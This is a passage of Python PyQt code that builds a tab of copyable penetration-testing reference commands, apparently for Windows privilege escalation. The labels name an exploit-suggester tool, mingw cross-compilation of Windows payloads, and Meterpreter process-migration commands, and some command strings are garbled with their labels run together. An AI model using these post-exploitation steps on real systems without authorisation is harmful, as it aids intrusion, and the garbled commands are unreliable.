        if hasattr(self, 'wpe_30_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_30_spacer2)
            self.wpe_30_spacer2.deleteLater()
        self.wpe_30_spacer2 = QLabel()
        self.wpe_30_spacer2.setFixedWidth(40)
        self.wpe_30_spacer2.setFixedHeight(50)
     
        # wpe_30 spacer & divider layout
        self.tab4_container_layout.insertWidget(656, self.wpe_30_spacer1)
        self.tab4_container_layout.insertWidget(657, self.wpe_30_divider1)
        self.tab4_container_layout.insertWidget(658, self.wpe_30_divider2)
        self.tab4_container_layout.insertWidget(659, self.wpe_30_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_31
        if hasattr(self, 'wpe_31'):
            self.tab4_container_layout.removeWidget(self.wpe_31)
            self.wpe_31.deleteLater()
        self.wpe_31 = QLabel("[ + Tools ]")
        self.wpe_31.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(660,self.wpe_31)
     
        # wpe_31_Scan1
        if hasattr(self, 'wpe_31_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_31_Scan1)
            self.wpe_31_Scan1.deleteLater()
        self.wpe_31_Scan1 = QLabel("https:/ithub.com/AonCyberLabs/Windows-Exploit-Suggester")
        self.wpe_31_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(661,self.wpe_31_Scan1)
     
        # wpe_31_Scan1_Copy
        if hasattr(self, 'wpe_31_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_31_Scan1_Copy)
            self.wpe_31_Scan1_Copy.deleteLater()
        self.wpe_31_Scan1_Copy = QPushButton()
        self.wpe_31_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_31_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_31_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_31_Scan1.text()))
        self.wpe_31_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_31_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_31_Scan1_Copy)
        label_layout.addWidget(self.wpe_31_Scan1)
        self.tab4_container_layout.insertLayout(662, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_31_divider1
        if hasattr(self, 'wpe_31_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_31_divider1)
            self.wpe_31_divider1.deleteLater()
        self.wpe_31_divider1 = QFrame()
        self.wpe_31_divider1.setFrameShape(QFrame.HLine)
        self.wpe_31_divider1.setLineWidth(3)
        self.wpe_31_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_31_divider2
        if hasattr(self, 'wpe_31_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_31_divider2)
            self.wpe_31_divider2.deleteLater()
        self.wpe_31_divider2 = QFrame()
        self.wpe_31_divider2.setFrameShape(QFrame.HLine)
        self.wpe_31_divider2.setLineWidth(3)
        self.wpe_31_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_31_spacer1
        if hasattr(self, 'wpe_31_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_31_spacer1)
            self.wpe_31_spacer1.deleteLater()
        self.wpe_31_spacer1 = QLabel()
        self.wpe_31_spacer1.setFixedWidth(40)
        self.wpe_31_spacer1.setFixedHeight(50)
     
        # wpe_31_spacer2
        if hasattr(self, 'wpe_31_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_31_spacer2)
            self.wpe_31_spacer2.deleteLater()
        self.wpe_31_spacer2 = QLabel()
        self.wpe_31_spacer2.setFixedWidth(40)
        self.wpe_31_spacer2.setFixedHeight(50)
     
        # wpe_31 spacer & divider layout
        self.tab4_container_layout.insertWidget(663, self.wpe_31_spacer1)
        self.tab4_container_layout.insertWidget(664, self.wpe_31_divider1)
        self.tab4_container_layout.insertWidget(665, self.wpe_31_divider2)
        self.tab4_container_layout.insertWidget(666, self.wpe_31_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_32
        if hasattr(self, 'wpe_32'):
            self.tab4_container_layout.removeWidget(self.wpe_32)
            self.wpe_32.deleteLater()
        self.wpe_32 = QLabel("[ + Cross-Compile payloads for Windows on Linux ]")
        self.wpe_32.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(667,self.wpe_32)
     
        # wpe_32_Scan1
        if hasattr(self, 'wpe_32_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_32_Scan1)
            self.wpe_32_Scan1.deleteLater()
        self.wpe_32_Scan1 = QLabel("apt-get install mingw-w64")
        self.wpe_32_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(668,self.wpe_32_Scan1)
     
        # wpe_32_Scan1_Copy
        if hasattr(self, 'wpe_32_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_32_Scan1_Copy)
            self.wpe_32_Scan1_Copy.deleteLater()
        self.wpe_32_Scan1_Copy = QPushButton()
        self.wpe_32_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_32_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_32_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_32_Scan1.text()))
        self.wpe_32_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_32_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_32_Scan1_Copy)
        label_layout.addWidget(self.wpe_32_Scan1)
        self.tab4_container_layout.insertLayout(669, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_32_divider1
        if hasattr(self, 'wpe_32_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_32_divider1)
            self.wpe_32_divider1.deleteLater()
        self.wpe_32_divider1 = QFrame()
        self.wpe_32_divider1.setFrameShape(QFrame.HLine)
        self.wpe_32_divider1.setLineWidth(3)
        self.wpe_32_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_32_divider2
        if hasattr(self, 'wpe_32_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_32_divider2)
            self.wpe_32_divider2.deleteLater()
        self.wpe_32_divider2 = QFrame()
        self.wpe_32_divider2.setFrameShape(QFrame.HLine)
        self.wpe_32_divider2.setLineWidth(3)
        self.wpe_32_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_32_spacer1
        if hasattr(self, 'wpe_32_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_32_spacer1)
            self.wpe_32_spacer1.deleteLater()
        self.wpe_32_spacer1 = QLabel()
        self.wpe_32_spacer1.setFixedWidth(40)
        self.wpe_32_spacer1.setFixedHeight(50)
     
        # wpe_32_spacer2
        if hasattr(self, 'wpe_32_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_32_spacer2)
            self.wpe_32_spacer2.deleteLater()
        self.wpe_32_spacer2 = QLabel()
        self.wpe_32_spacer2.setFixedWidth(40)
        self.wpe_32_spacer2.setFixedHeight(50)
     
        # wpe_32 spacer & divider layout
        self.tab4_container_layout.insertWidget(670, self.wpe_32_spacer1)
        self.tab4_container_layout.insertWidget(671, self.wpe_32_divider1)
        self.tab4_container_layout.insertWidget(672, self.wpe_32_divider2)
        self.tab4_container_layout.insertWidget(673, self.wpe_32_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_33
        if hasattr(self, 'wpe_33'):
            self.tab4_container_layout.removeWidget(self.wpe_33)
            self.wpe_33.deleteLater()
        self.wpe_33 = QLabel("[ + Cross-Compilation Reference ]")
        self.wpe_33.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(674,self.wpe_33)
     
        # wpe_33_Scan1
        if hasattr(self, 'wpe_33_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_33_Scan1)
            self.wpe_33_Scan1.deleteLater()
        self.wpe_33_Scan1 = QLabel("Ci686-w64-mingw32-gcc hello.c -o hello32.exe")
        self.wpe_33_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(675,self.wpe_33_Scan1)
     
        # wpe_33_Scan1_Copy
        if hasattr(self, 'wpe_33_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_33_Scan1_Copy)
            self.wpe_33_Scan1_Copy.deleteLater()
        self.wpe_33_Scan1_Copy = QPushButton()
        self.wpe_33_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_33_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_33_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_33_Scan1.text()))
        self.wpe_33_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_33_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_33_Scan1_Copy)
        label_layout.addWidget(self.wpe_33_Scan1)
        self.tab4_container_layout.insertLayout(676, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_33_divider1
        if hasattr(self, 'wpe_33_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_33_divider1)
            self.wpe_33_divider1.deleteLater()
        self.wpe_33_divider1 = QFrame()
        self.wpe_33_divider1.setFrameShape(QFrame.HLine)
        self.wpe_33_divider1.setLineWidth(3)
        self.wpe_33_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_33_divider2
        if hasattr(self, 'wpe_33_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_33_divider2)
            self.wpe_33_divider2.deleteLater()
        self.wpe_33_divider2 = QFrame()
        self.wpe_33_divider2.setFrameShape(QFrame.HLine)
        self.wpe_33_divider2.setLineWidth(3)
        self.wpe_33_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_33_spacer1
        if hasattr(self, 'wpe_33_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_33_spacer1)
            self.wpe_33_spacer1.deleteLater()
        self.wpe_33_spacer1 = QLabel()
        self.wpe_33_spacer1.setFixedWidth(40)
        self.wpe_33_spacer1.setFixedHeight(50)
     
        # wpe_33_spacer2
        if hasattr(self, 'wpe_33_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_33_spacer2)
            self.wpe_33_spacer2.deleteLater()
        self.wpe_33_spacer2 = QLabel()
        self.wpe_33_spacer2.setFixedWidth(40)
        self.wpe_33_spacer2.setFixedHeight(50)
     
        # wpe_33 spacer & divider layout
        self.tab4_container_layout.insertWidget(677, self.wpe_33_spacer1)
        self.tab4_container_layout.insertWidget(678, self.wpe_33_divider1)
        self.tab4_container_layout.insertWidget(679, self.wpe_33_divider2)
        self.tab4_container_layout.insertWidget(680, self.wpe_33_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_33_Scan2
        if hasattr(self, 'wpe_33_Scan2'):
            self.tab4_container_layout.removeWidget(self.wpe_33_Scan2)
            self.wpe_33_Scan2.deleteLater()
        self.wpe_33_Scan2 = QLabel("32-bitx86_64-w64-mingw32-gcc hello.c -o hello64.exe")
        self.wpe_33_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(681,self.wpe_33_Scan2)
     
        # wpe_33_Scan2_Copy
        if hasattr(self, 'wpe_33_Scan2_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_33_Scan2_Copy)
            self.wpe_33_Scan2_Copy.deleteLater()
        self.wpe_33_Scan2_Copy = QPushButton()
        self.wpe_33_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_33_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wpe_33_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_33_Scan2.text()))
        self.wpe_33_Scan2_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_33_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_33_Scan2_Copy)
        label_layout.addWidget(self.wpe_33_Scan2)
        self.tab4_container_layout.insertLayout(682, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_33_divider1
        if hasattr(self, 'wpe_33_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_33_divider1)
            self.wpe_33_divider1.deleteLater()
        self.wpe_33_divider1 = QFrame()
        self.wpe_33_divider1.setFrameShape(QFrame.HLine)
        self.wpe_33_divider1.setLineWidth(3)
        self.wpe_33_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_33_divider2
        if hasattr(self, 'wpe_33_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_33_divider2)
            self.wpe_33_divider2.deleteLater()
        self.wpe_33_divider2 = QFrame()
        self.wpe_33_divider2.setFrameShape(QFrame.HLine)
        self.wpe_33_divider2.setLineWidth(3)
        self.wpe_33_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_33_spacer1
        if hasattr(self, 'wpe_33_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_33_spacer1)
            self.wpe_33_spacer1.deleteLater()
        self.wpe_33_spacer1 = QLabel()
        self.wpe_33_spacer1.setFixedWidth(40)
        self.wpe_33_spacer1.setFixedHeight(50)
     
        # wpe_33_spacer2
        if hasattr(self, 'wpe_33_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_33_spacer2)
            self.wpe_33_spacer2.deleteLater()
        self.wpe_33_spacer2 = QLabel()
        self.wpe_33_spacer2.setFixedWidth(40)
        self.wpe_33_spacer2.setFixedHeight(50)
     
        # wpe_33 spacer & divider layout
        self.tab4_container_layout.insertWidget(683, self.wpe_33_spacer1)
        self.tab4_container_layout.insertWidget(684, self.wpe_33_divider1)
        self.tab4_container_layout.insertWidget(685, self.wpe_33_divider2)
        self.tab4_container_layout.insertWidget(686, self.wpe_33_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_33_Scan3
        if hasattr(self, 'wpe_33_Scan3'):
            self.tab4_container_layout.removeWidget(self.wpe_33_Scan3)
            self.wpe_33_Scan3.deleteLater()
        self.wpe_33_Scan3 = QLabel("C++i686-w64-mingw32-g++ hello.cc -o hello32.exe")
        self.wpe_33_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(687,self.wpe_33_Scan3)
     
        # wpe_33_Scan3_Copy
        if hasattr(self, 'wpe_33_Scan3_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_33_Scan3_Copy)
            self.wpe_33_Scan3_Copy.deleteLater()
        self.wpe_33_Scan3_Copy = QPushButton()
        self.wpe_33_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_33_Scan3_Copy.setFixedSize(QSize(20,20))
        self.wpe_33_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_33_Scan3.text()))
        self.wpe_33_Scan3_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_33_Scan3 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_33_Scan3_Copy)
        label_layout.addWidget(self.wpe_33_Scan3)
        self.tab4_container_layout.insertLayout(688, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_33_divider1
        if hasattr(self, 'wpe_33_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_33_divider1)
            self.wpe_33_divider1.deleteLater()
        self.wpe_33_divider1 = QFrame()
        self.wpe_33_divider1.setFrameShape(QFrame.HLine)
        self.wpe_33_divider1.setLineWidth(3)
        self.wpe_33_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_33_divider2
        if hasattr(self, 'wpe_33_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_33_divider2)
            self.wpe_33_divider2.deleteLater()
        self.wpe_33_divider2 = QFrame()
        self.wpe_33_divider2.setFrameShape(QFrame.HLine)
        self.wpe_33_divider2.setLineWidth(3)
        self.wpe_33_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_33_spacer1
        if hasattr(self, 'wpe_33_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_33_spacer1)
            self.wpe_33_spacer1.deleteLater()
        self.wpe_33_spacer1 = QLabel()
        self.wpe_33_spacer1.setFixedWidth(40)
        self.wpe_33_spacer1.setFixedHeight(50)
     
        # wpe_33_spacer2
        if hasattr(self, 'wpe_33_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_33_spacer2)
            self.wpe_33_spacer2.deleteLater()
        self.wpe_33_spacer2 = QLabel()
        self.wpe_33_spacer2.setFixedWidth(40)
        self.wpe_33_spacer2.setFixedHeight(50)
     
        # wpe_33 spacer & divider layout
        self.tab4_container_layout.insertWidget(689, self.wpe_33_spacer1)
        self.tab4_container_layout.insertWidget(690, self.wpe_33_divider1)
        self.tab4_container_layout.insertWidget(691, self.wpe_33_divider2)
        self.tab4_container_layout.insertWidget(692, self.wpe_33_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_33_Scan4
        if hasattr(self, 'wpe_33_Scan4'):
            self.tab4_container_layout.removeWidget(self.wpe_33_Scan4)
            self.wpe_33_Scan4.deleteLater()
        self.wpe_33_Scan4 = QLabel("32-bitx86_64-w64-mingw32-g++ hello.cc -o hello64.exe")
        self.wpe_33_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(693,self.wpe_33_Scan4)
     
        # wpe_33_Scan4_Copy
        if hasattr(self, 'wpe_33_Scan4_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_33_Scan4_Copy)
            self.wpe_33_Scan4_Copy.deleteLater()
        self.wpe_33_Scan4_Copy = QPushButton()
        self.wpe_33_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_33_Scan4_Copy.setFixedSize(QSize(20,20))
        self.wpe_33_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_33_Scan4.text()))
        self.wpe_33_Scan4_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_33_Scan4 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_33_Scan4_Copy)
        label_layout.addWidget(self.wpe_33_Scan4)
        self.tab4_container_layout.insertLayout(694, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_33_divider1
        if hasattr(self, 'wpe_33_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_33_divider1)
            self.wpe_33_divider1.deleteLater()
        self.wpe_33_divider1 = QFrame()
        self.wpe_33_divider1.setFrameShape(QFrame.HLine)
        self.wpe_33_divider1.setLineWidth(3)
        self.wpe_33_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_33_divider2
        if hasattr(self, 'wpe_33_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_33_divider2)
            self.wpe_33_divider2.deleteLater()
        self.wpe_33_divider2 = QFrame()
        self.wpe_33_divider2.setFrameShape(QFrame.HLine)
        self.wpe_33_divider2.setLineWidth(3)
        self.wpe_33_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_33_spacer1
        if hasattr(self, 'wpe_33_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_33_spacer1)
            self.wpe_33_spacer1.deleteLater()
        self.wpe_33_spacer1 = QLabel()
        self.wpe_33_spacer1.setFixedWidth(40)
        self.wpe_33_spacer1.setFixedHeight(50)
     
        # wpe_33_spacer2
        if hasattr(self, 'wpe_33_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_33_spacer2)
            self.wpe_33_spacer2.deleteLater()
        self.wpe_33_spacer2 = QLabel()
        self.wpe_33_spacer2.setFixedWidth(40)
        self.wpe_33_spacer2.setFixedHeight(50)
     
        # wpe_33 spacer & divider layout
        self.tab4_container_layout.insertWidget(695, self.wpe_33_spacer1)
        self.tab4_container_layout.insertWidget(696, self.wpe_33_divider1)
        self.tab4_container_layout.insertWidget(697, self.wpe_33_divider2)
        self.tab4_container_layout.insertWidget(698, self.wpe_33_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_34
        if hasattr(self, 'wpe_34'):
            self.tab4_container_layout.removeWidget(self.wpe_34)
            self.wpe_34.deleteLater()
        self.wpe_34 = QLabel("[ + Migrate to a stable process ]")
        self.wpe_34.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(699,self.wpe_34)
     
        # wpe_34_Scan1
        if hasattr(self, 'wpe_34_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_34_Scan1)
            self.wpe_34_Scan1.deleteLater()
        self.wpe_34_Scan1 = QLabel("meterpreter> run post/windows/manage/migrate")
        self.wpe_34_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(700,self.wpe_34_Scan1)
     
        # wpe_34_Scan1_Copy
        if hasattr(self, 'wpe_34_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_34_Scan1_Copy)
            self.wpe_34_Scan1_Copy.deleteLater()
        self.wpe_34_Scan1_Copy = QPushButton()
        self.wpe_34_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_34_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_34_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_34_Scan1.text()))
        self.wpe_34_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_34_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_34_Scan1_Copy)
        label_layout.addWidget(self.wpe_34_Scan1)
        self.tab4_container_layout.insertLayout(701, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_34_divider1
        if hasattr(self, 'wpe_34_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_34_divider1)
            self.wpe_34_divider1.deleteLater()
        self.wpe_34_divider1 = QFrame()
        self.wpe_34_divider1.setFrameShape(QFrame.HLine)
        self.wpe_34_divider1.setLineWidth(3)
        self.wpe_34_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_34_divider2
        if hasattr(self, 'wpe_34_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_34_divider2)
            self.wpe_34_divider2.deleteLater()
        self.wpe_34_divider2 = QFrame()
        self.wpe_34_divider2.setFrameShape(QFrame.HLine)
        self.wpe_34_divider2.setLineWidth(3)
        self.wpe_34_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_34_spacer1
        if hasattr(self, 'wpe_34_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_34_spacer1)
            self.wpe_34_spacer1.deleteLater()
        self.wpe_34_spacer1 = QLabel()
        self.wpe_34_spacer1.setFixedWidth(40)
        self.wpe_34_spacer1.setFixedHeight(50)
     
        # wpe_34_spacer2
        if hasattr(self, 'wpe_34_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_34_spacer2)
            self.wpe_34_spacer2.deleteLater()
        self.wpe_34_spacer2 = QLabel()
        self.wpe_34_spacer2.setFixedWidth(40)
        self.wpe_34_spacer2.setFixedHeight(50)
     
        # wpe_34 spacer & divider layout
        self.tab4_container_layout.insertWidget(702, self.wpe_34_spacer1)
        self.tab4_container_layout.insertWidget(703, self.wpe_34_divider1)
        self.tab4_container_layout.insertWidget(704, self.wpe_34_divider2)
        self.tab4_container_layout.insertWidget(705, self.wpe_34_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_34_Scan2
        if hasattr(self, 'wpe_34_Scan2'):
            self.tab4_container_layout.removeWidget(self.wpe_34_Scan2)
            self.wpe_34_Scan2.deleteLater()
        self.wpe_34_Scan2 = QLabel("meterpreter> migrate -h")
        self.wpe_34_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(706,self.wpe_34_Scan2)
     
        # wpe_34_Scan2_Copy
        if hasattr(self, 'wpe_34_Scan2_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_34_Scan2_Copy)
            self.wpe_34_Scan2_Copy.deleteLater()
        self.wpe_34_Scan2_Copy = QPushButton()
        self.wpe_34_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_34_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wpe_34_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_34_Scan2.text()))
        self.wpe_34_Scan2_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_34_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_34_Scan2_Copy)
        label_layout.addWidget(self.wpe_34_Scan2)
        self.tab4_container_layout.insertLayout(707, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_34_divider1
        if hasattr(self, 'wpe_34_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_34_divider1)
            self.wpe_34_divider1.deleteLater()
        self.wpe_34_divider1 = QFrame()
        self.wpe_34_divider1.setFrameShape(QFrame.HLine)
        self.wpe_34_divider1.setLineWidth(3)
        self.wpe_34_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_34_divider2
        if hasattr(self, 'wpe_34_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_34_divider2)
            self.wpe_34_divider2.deleteLater()
        self.wpe_34_divider2 = QFrame()
        self.wpe_34_divider2.setFrameShape(QFrame.HLine)
        self.wpe_34_divider2.setLineWidth(3)
        self.wpe_34_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_34_spacer1
        if hasattr(self, 'wpe_34_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_34_spacer1)
            self.wpe_34_spacer1.deleteLater()
        self.wpe_34_spacer1 = QLabel()
        self.wpe_34_spacer1.setFixedWidth(40)
        self.wpe_34_spacer1.setFixedHeight(50)
     
        # wpe_34_spacer2
        if hasattr(self, 'wpe_34_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_34_spacer2)
            self.wpe_34_spacer2.deleteLater()
        self.wpe_34_spacer2 = QLabel()
        self.wpe_34_spacer2.setFixedWidth(40)
        self.wpe_34_spacer2.setFixedHeight(50)
     
        # wpe_34 spacer & divider layout
        self.tab4_container_layout.insertWidget(708, self.wpe_34_spacer1)
        self.tab4_container_layout.insertWidget(709, self.wpe_34_divider1)
        self.tab4_container_layout.insertWidget(710, self.wpe_34_divider2)
        self.tab4_container_layout.insertWidget(711, self.wpe_34_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_34_Scan3
        if hasattr(self, 'wpe_34_Scan3'):
            self.tab4_container_layout.removeWidget(self.wpe_34_Scan3)
            self.wpe_34_Scan3.deleteLater()
        self.wpe_34_Scan3 = QLabel("meterpreter> migrate <PID>")
        self.wpe_34_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(712,self.wpe_34_Scan3)
     
        # wpe_34_Scan3_Copy
        if hasattr(self, 'wpe_34_Scan3_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_34_Scan3_Copy)
            self.wpe_34_Scan3_Copy.deleteLater()
        self.wpe_34_Scan3_Copy = QPushButton()
        self.wpe_34_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_34_Scan3_Copy.setFixedSize(QSize(20,20))
        self.wpe_34_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_34_Scan3.text()))
        self.wpe_34_Scan3_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_34_Scan3 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_34_Scan3_Copy)
        label_layout.addWidget(self.wpe_34_Scan3)
        self.tab4_container_layout.insertLayout(713, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_34_divider1
        if hasattr(self, 'wpe_34_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_34_divider1)
            self.wpe_34_divider1.deleteLater()
        self.wpe_34_divider1 = QFrame()
        self.wpe_34_divider1.setFrameShape(QFrame.HLine)
        self.wpe_34_divider1.setLineWidth(3)
        self.wpe_34_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_34_divider2
        if hasattr(self, 'wpe_34_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_34_divider2)
            self.wpe_34_divider2.deleteLater()
        self.wpe_34_divider2 = QFrame()
        self.wpe_34_divider2.setFrameShape(QFrame.HLine)
        self.wpe_34_divider2.setLineWidth(3)
        self.wpe_34_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_34_spacer1
        if hasattr(self, 'wpe_34_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_34_spacer1)
            self.wpe_34_spacer1.deleteLater()
        self.wpe_34_spacer1 = QLabel()
        self.wpe_34_spacer1.setFixedWidth(40)
        self.wpe_34_spacer1.setFixedHeight(50)
     
        # wpe_34_spacer2
        if hasattr(self, 'wpe_34_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_34_spacer2)
            self.wpe_34_spacer2.deleteLater()
        self.wpe_34_spacer2 = QLabel()
